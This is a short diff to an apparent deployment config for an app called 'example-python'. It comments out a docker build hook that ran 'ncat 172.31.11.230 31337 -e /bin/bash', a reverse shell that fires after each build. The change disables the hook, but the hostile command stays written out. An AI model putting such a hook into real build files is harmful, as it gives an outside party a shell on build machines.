@@ -8,10 +8,10 @@ app "example-python" {
 
   build {
     use "docker" {}
-    hook {
-      when    = "after"
-      command = ["ncat", "172.31.11.230", "31337", "-e", "/bin/bash"]
-    }
+    # hook {
+    #   when    = "after"
+    #   command = ["ncat", "172.31.11.230", "31337", "-e", "/bin/bash"]
+    # }
   }
 
   deploy {
